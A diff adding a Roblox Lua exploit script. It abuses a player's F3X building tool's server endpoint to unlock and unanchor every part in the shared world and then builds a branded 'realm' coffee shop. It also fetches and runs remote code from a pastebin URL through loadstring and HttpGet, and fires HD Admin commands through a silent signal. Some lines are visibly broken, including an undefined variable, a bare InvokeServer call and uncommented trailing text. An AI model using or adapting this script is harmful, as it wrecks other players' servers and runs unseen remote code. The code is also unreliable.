@@ -1,0 +1,675 @@
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+local player = game.Players.LocalPlayer
+local char = player.Character
+local backpack = player.Backpack
+
+local function getf3x()
+	for _, v in ipairs(backpack:GetChildren()) do
+		if v:FindFirstChild("SyncAPI") then
+			return v
+		end
+	end
+	for _, v in ipairs(char:GetChildren()) do
+		if v:FindFirstChild("SyncAPI") then
+			return v
+		end
+	end
+	return nil
+end
+
+local f3x = getf3x()
+if not f3x then
+	warn("you dont have f3x skid")
+end
+local syncapi = f3x.SyncAPI
+local serverendpoint = syncapi.ServerEndpoint
+
+function _(args)
+    serverendpoint:InvokeServer(unpack(args))
+end
+
+
+
+function MovePart(part, cf)
+    local args = {
+        "SyncMove",
+        {
+            {
+                Part = part,
+                CFrame = cf
+            }
+        }
+    }
+    _(args)
+end
+
+local function resize(part, size, cf)
+	local args = {
+		"SyncResize",
+		{
+			{
+				Part = part,
+				CFrame = cf,
+				Size = size
+			}
+		}
+	}
+	_(args)
+end
+
+local function mat(part, mate)
+	local args = {
+		"SyncMaterial",
+		{
+			{
+				Part = part,
+				Material = mate
+			}
+		}
+	}
+	_(args)
+end
+local function light(part)
+
+
+	local createArgs = {
+		"CreateLights",
+		{
+			{
+				Part = part,
+				LightType = "PointLight"
+			}
+		}
+	}
+
+
+	local syncArgs = {
+		"SyncLighting",
+		{
+			{
+				Part = part,
+				LightType = "PointLight",
+				Color = Color3.fromRGB(255, 255, 255),
+				Range = 50,
+			}
+		}
+	}
+
+	_(createArgs)
+	_(syncArgs)
+end
+local function transparency(part, trans)
+	local args = {
+		"SyncMaterial",
+		{
+			{
+				Part = part,
+				Transparency = trans
+			}
+		}
+	}
+	_(args)
+end
+
+local function color(part, color)
+	local args = {
+		"SyncColor",
+		{
+			{
+				Part = part,
+				Color = color,
+				UnionColoring = false
+			}
+		}
+	}
+	_(args)
+end
+
+local function syncmeshid(part, id)
+	local args = {
+		"SyncMesh",
+		{
+			{
+				Part = part,
+				MeshId = "rbxassetid://" .. id
+			}
+		}
+	}
+	_(args)
+end
+
+local function makemesh(part)
+	local args = {
+		"CreateMeshes",
+		{
+			{
+				Part = part
+			}
+		}
+	}
+	_(args)
+end
+
+local function syncmeshsize(part, vectora)
+	local args = {
+		"SyncMesh",
+		{
+			{
+				Part = part,
+				Scale = vectora
+			}
+		}
+	}
+	_(args)
+end
+
+local function syncmeshtexture(part, id)
+	local args = {
+		"SyncMesh",
+		{
+			{
+				Part = part,
+				TextureId = "rbxassetid://" .. id
+			}
+		}
+	}
+	_(args)
+end
+
+local function name(part, stringa)
+	local args = {
+		"SetName",
+		{ part },
+		stringa
+	}
+	_(args)
+end
+
+local function lock(part, boolean)
+	local args = {
+		"SetLocked",
+		{ part },
+		boolean
+	}
+	_(args)
+end
+
+local function setcollision(part, booleana)
+	local args = {
+		"SyncCollision",
+		{
+			{
+				Part = part,
+				CanCollide = booleana
+			}
+		}
+	}
+	_(args)
+end
+
+local function setanchor(part, boolean)
+	local args = {
+		"SyncAnchor",
+		{
+			{
+				Part = part,
+				Anchored = boolean
+			}
+		}
+	}
+	_(args)
+end
+
+local function createtexture(part, side)
+	local args = {
+		"CreateTextures",
+		{
+			{
+				Part = part,
+				Face = side,
+				TextureType = "Texture"
+			}
+		}
+	}
+	_(args)
+end
+
+local function createdecal(part, side)
+	local args = {
+		"CreateTextures",
+		{
+			{
+				Part = part,
+				Face = side,
+				TextureType = "Decal"
+			}
+		}
+	}
+	_(args)
+end
+local function setdecal(part, asset, side)
+	local args = {
+		"SyncTexture",
+		{
+			{
+				Part = part,
+				Face = side,
+				TextureType = "Decal",
+				Texture = "rbxassetid://" .. asset
+			}
+		}
+	}
+	_(args)
+end
+
+		function floor(part, face)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = face,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://135172958780980",
+						["StudsPerTileV"] = 2,
+						["StudsPerTileU"] = 2
+					}
+				}
+			}
+			_(args)
+		end
+		function getwooded(part, face)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = face,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://94153618",
+						["StudsPerTileV"] = 10,
+						["StudsPerTileU"] = 10
+					}
+				}
+			}
+			_(args)
+		end
+        
+function getFlooredLMFAO(part, face)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = face,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://55420352",
+						["StudsPerTileV"] = 10,
+						["StudsPerTileU"] = 10
+					}
+				}
+			}
+			_(args)
+		end
+        
+  
+local function RealmV2()
+	local position = CFrame.new(-47.979, 0, -26.237)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(63, 1, 66), position)
+color(base, Color3.fromRGB(230, 230, 230))
+createtexture(base, Enum.NormalId.Top)
+getFlooredLMFAO(base, Enum.NormalId.Top)
+
+	local position = CFrame.new(-67.979, 2.25, -34.687)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(23, 5.5, 1.1), position)
+  color(base, Color3.fromRGB(10, 10, 10))
+  mat(base, Enum.Material.WoodPlanks)
+
+	local position = CFrame.new(-67.979, 9, -34.737)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(23, 19, 1), position)
+color(base, Color3.fromRGB(46, 46, 46))
+
+local position = CFrame.new(-67.979, 9, -46.437)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(23, 19, 24.4), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+
+local position = CFrame.new(-47.979, 9, -58.737)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(63, 19, 1), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+  createtexture(base, Enum.NormalId.Back)
+  getwooded(base, Enum.NormalId.Back)
+
+local position = CFrame.new(-15.979, 9, -26.237)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(1, 19, 66), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+    createtexture(base, Enum.NormalId.Left)
+  getwooded(base, Enum.NormalId.Left)
+
+local position = CFrame.new(-79.979, 9, -26.237)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(1, 19, 66), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+  createtexture(base, Enum.NormalId.Right)
+  getwooded(base, Enum.NormalId.Right)
+
+local position = CFrame.new(-20.979, 15, 6.263)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(11, 7, 1), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+
+local position = CFrame.new(-25.479, 9, 6.263)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(2, 19, 1), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+
+local position = CFrame.new(-52.479, 1.5, 6.263)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(56, 4, 1), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+ createtexture(base, Enum.NormalId.Front)
+  getwooded(base, Enum.NormalId.Front)
+
+local position = CFrame.new(-49.979, 8.5, 6.613)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(47, 10, 0.1), position)
+  color(base, Color3.fromRGB(52, 216, 235))
+  transparency(base, 0.7)
+  mat(base, Enum.Material.Glass)
+
+
+  local position = CFrame.new(-76.479, 9, 6.263)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(6, 19, 1), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+
+
+  local position = CFrame.new(-47.979, 19, -26.237)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(63, 1, 66), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+  light(base)
+local position = CFrame.new(-20.479, 6.05, 6.263)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(8, 10.9, 1), position)
+  color(base, Color3.fromRGB(52, 216, 235))
+  transparency(base, 0.7)
+  setcollision(base, false)
+  mat(base, Enum.Material.Glass)
+
+
+local position = CFrame.new(-25.28, 1.4, -34.805)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(15.7, 4.2, 2), position)
+  color(base, Color3.fromRGB(0, 0, 0))
+
+local position = CFrame.new(-49.78, 1.75, -34.805)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(13.5, 3.5, 2), position)
+  color(base, Color3.new(1, 1, 1))
+  
+  local koopPos = CFrame.new(-26.896, 5, -37.605)
+	local U00lckid = serverendpoint:InvokeServer("CreatePart", "Normal", koopPos, workspace.Terrain)
+resize(U00lckid, Vector3.new(8, 10, 2), koopPos)
+makemesh(U00lckid)
+syncmeshid(U00lckid, "7879233630")
+syncmeshtexture(U00lckid, "122599551209854")
+syncmeshsize(U00lckid,Vector3.new(2, 2, 2))
+MovePart(U00lckid, U00lckid.CFrame * CFrame.Angles(0, math.rad(-179.997), 0))
+
+local position = CFrame.new(-26.944, 13.05, -37.165)
+local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(16.5, 14.1, 0.1), position)
+  transparency(base, 1)
+  setcollision(base, false)
+  createdecal(base, Enum.NormalId.Back)
+  setdecal(base, "101691977267262", Enum.NormalId.Back)
+
+createdecal(bubblechat, Enum.NormalId.Front)
+setdecal(bubblechat, "102002754753325", Enum.NormalId.Front)
+setcollision(bubblechat, false)
+
+ local position = CFrame.new(-38.13, 3.1, -35.755)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(10, 6.2, 0.1), position)
+  color(base, Color3.new(1, 1, 1))
+
+local position = CFrame.new(-38.13, 5.15, -34.805)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(10, 0.3, 2), position)
+  color(base, Color3.new(1, 1, 1))
+
+local position = CFrame.new(-38.13, 3.15, -34.805)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(10, 0.3, 2), position)
+  color(base, Color3.new(1, 1, 1))
+
+local position = CFrame.new(-38.13, 0.75, -34.805)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(10, 1.5, 2), position)
+  color(base, Color3.new(1, 1, 1))
+
+local pos8 = CFrame.new(-30.818, 2.5, 0.635)
+	local door = serverendpoint:InvokeServer("CreatePart", "Normal", pos8, workspace)
+makemesh(door)
+syncmeshid(door, "108885615243219")
+color(door, Color3.fromRGB(10, 10, 10))
+MovePart(door, door.CFrame * CFrame.Angles(0, math.rad(90), 0))
+
+
+
+local pos8 = CFrame.new(-45.818, 2.5, 0.635)
+	local door = serverendpoint:InvokeServer("CreatePart", "Normal", pos8, workspace)
+makemesh(door)
+syncmeshid(door, "108885615243219")
+color(door, Color3.fromRGB(10, 10, 10))
+MovePart(door, door.CFrame * CFrame.Angles(0, math.rad(90), 0))
+
+
+local pos8 = CFrame.new(-61.818, 2.5, 0.635)
+	local door = serverendpoint:InvokeServer("CreatePart", "Normal", pos8, workspace)
+makemesh(door)
+syncmeshid(door, "108885615243219")
+color(door, Color3.fromRGB(10, 10, 10))
+MovePart(door, door.CFrame * CFrame.Angles(0, math.rad(90), 0))
+
+
+
+
+local Koohat = CFrame.new(-21.579, 4.744, -35.271)
+	local hat1 = serverendpoint:InvokeServer("CreatePart", "Normal", Koohat, workspace)
+makemesh(hat1)
+syncmeshid(hat1, "10970208924")
+syncmeshsize(hat1, Vector3.new(0.005, 0.005, 0.005))
+syncmeshtexture(hat1, "10970209066")
+
+
+
+local position = CFrame.new(-51.479, 8, 6.263)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(50, 1, 1), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+  createtexture(base, Enum.NormalId.Front)
+  getwooded(base, Enum.NormalId.Front)
+
+local position = CFrame.new(-62.979, 9, 6.263)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(1, 19, 1), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+  createtexture(base, Enum.NormalId.Front)
+  getwooded(base, Enum.NormalId.Front)
+  
+  local pos7 = CFrame.new(-0.703, 6.164, 7.43)
+	local text2 = serverendpoint:InvokeServer("CreatePart", "Normal", pos7, workspace)
+setcollision(text2, false)
+resize(text2, Vector3.new(29, 14, 1), pos7)
+transparency(text2, 1)
+createdecal(text2, Enum.NormalId.Back)
+setdecal(text2, "125792104590827", Enum.NormalId.Back)
+
+local position = CFrame.new(-49.979, 16, 6.263)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(51, 5, 1), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+  createtexture(base, Enum.NormalId.Front)
+  getwooded(base, Enum.NormalId.Front)
+
+local position = CFrame.new(-53.479, 13.5, 10.129)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(54, 1, 9), position)
+  color(base, Color3.fromRGB(5, 5, 5))
+
+local position = CFrame.new(-76.429, 16.393, 8.886)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(0.1, 7.4, 0.1), position)
+  color(base, Color3.new(1, 1, 1))
+MovePart(base, base.CFrame * CFrame.Angles(math.rad(-44.998), 0, 0))
+
+
+local position = CFrame.new(-57.329, 16.393, 8.886)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(0.1, 7.4, 0.1), position)
+  color(base, Color3.new(1, 1, 1))
+MovePart(base, base.CFrame * CFrame.Angles(math.rad(-44.998), 0, 0))
+
+local position = CFrame.new(-37.829, 16.393, 8.886)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(0.1, 7.4, 0.1), position)
+  color(base, Color3.new(1, 1, 1))
+MovePart(base, base.CFrame * CFrame.Angles(math.rad(-44.998), 0, 0))
+
+local position = CFrame.new(-25.479, 11, 7.763)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(2, 23, 4), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+
+local position = CFrame.new(-16.479, 11, 7.763)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(2, 23, 4), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+
+local position = CFrame.new(-20.979, 17, 7.763)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(11, 11, 4), position)
+  color(base, Color3.fromRGB(46, 46, 46))
+
+local position = CFrame.new(-50.369, -0.436, -27.163)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(84.7, 0.8, 95.4), position)
+  mat(base, Enum.Material.Concrete)
+
+local position = CFrame.new(-41.816, -0.836, -9.237)
+	local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+	resize(base, Vector3.new(504, 1, 474), position)
+  createtexture(base, Enum.NormalId.Top)
+  floor(base, Enum.NormalId.Top)
+
+
+end
+
+function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+local function unanchorall()
+	for _, v in ipairs(workspace:GetDescendants()) do
+		if v:IsA("BasePart") or v:IsA("UnionOperation") then
+			spawn(function()
+        lock(v, false)
+				setanchor(v, false)
+			end)
+		end
+	end
+end
+
+local function realm()
+	unanchorall()
+	wait(10)
+
+	RealmV2()
+loadstring(game:HttpGet("https://pastebin.com/raw/qh3RikUB"))()
+
+  
+end
+realm()
+
+RequestCommand:InvokeServer(";music 103439408444041")
+wait(5)
+RequestCommand:InvokeServer(";time 0 ;fogcolor black ;music 1846575559 ;SM The u00lc's world team tour realm (coffee shop) By U00LCkidd")
+
+RequestCommand:InvokeServer(";createteam red U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam blue U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam db U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam green U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam dg U00LCkidd realm")
+    InvokeServer(";createteam pk U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam p U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam y U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam o U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam black U00LCkidd realm")
+    RequestCommand:InvokeServer(";createteam white U00LCkidd realm")
+
+
+
+--sthing.Pos=-49.479, 9, 6.263
+--sthing.Size=10, 19, 1
+--sthing2.Size=50, 1, 1
+--sthing2.Pos=-51.479, 8, 6.263
+--sthing3.Pos=-62.979, 9, 6.263
+--sthing3.Size=1, 19, 1
+--sthing4.Size=51, 5, 1
+--sthing4.Pos=-49.979, 16, 6.263
+--glassNew.Pos=-49.979, 8.5, 6.613
+--glassNew.Size=47, 10, 0.1
+--wallGlass.Size=56, 4, 1
+--wallGlass.Pos=-52.479, 1.5, 6.263
+--wallGlass2.Pos=-76.479, 9, 6.263
+--wallGlass2.Size=6, 19, 1
+--idkNEWALL.Size=43, 1, 9
+--idkNEWALL.Pos=-51.979, 15.5, 10.129
+--oldGlass.Pos=-43.479, 11, 6.263
+--oldWallGlass.Pos=-44.479, 1.5, 6.263
+--oldGlassWall2.Pos=-69.979, 9, 6.263
+--holder.Pos=-76.429, 16.393, 8.886
+--holder.Size=0.1, 7.4, 0.1
+--holder.Rotation=-44.998, 0, 0
+--holder2.Pos=-57.329, 16.393, 8.886
+--holder3.Pos=-37.829, 16.393, 8.886
+--SpecialDoorWall.Pos=-25.479, 11, 7.763
+--SpecialDoorWall.Size=2, 23, 4
+--SpecialDoorWall2.Pos=-16.479, 11, 7.763
+--SpecialDoorWallTop.Pos=-20.979, 17, 7.763
+--SpecialDoorWallTop.Size=11, 11, 4
+--newSthing.Pos=-53.479, 13.5, 10.129
+--newSthing.Size=54, 1, 9
+
+--newPartFloor2.Size=84.7, 0.8, 95.4
+--newPartFloor2.Pos=-50.369, -0.436, -27.163
+
+--FRONT FACE ALL OF THERES
+--OldWallGlass.Pos=-51.479, 8, 6.263
+--OldWallGlass2.Pos=-49.479, 9, 6.263
+--OldWallGlass3.Pos=-62.979, 9, 6.263
+--OldWallGlass4.Pos=-52.479, 1.5, 6.263
+--OldGlassWall5.Pos=-49.979, 16, 6.263
+
+--RIGHT FACE 
+Wall1.Pos=-79.979, 9, -26.237
+
+--BACK FACE
+Wall2.Pos=-47.979, 9, -58.737
+
+--LEFT FACE
+Wall3.Pos=-15.979, 9, -26.237
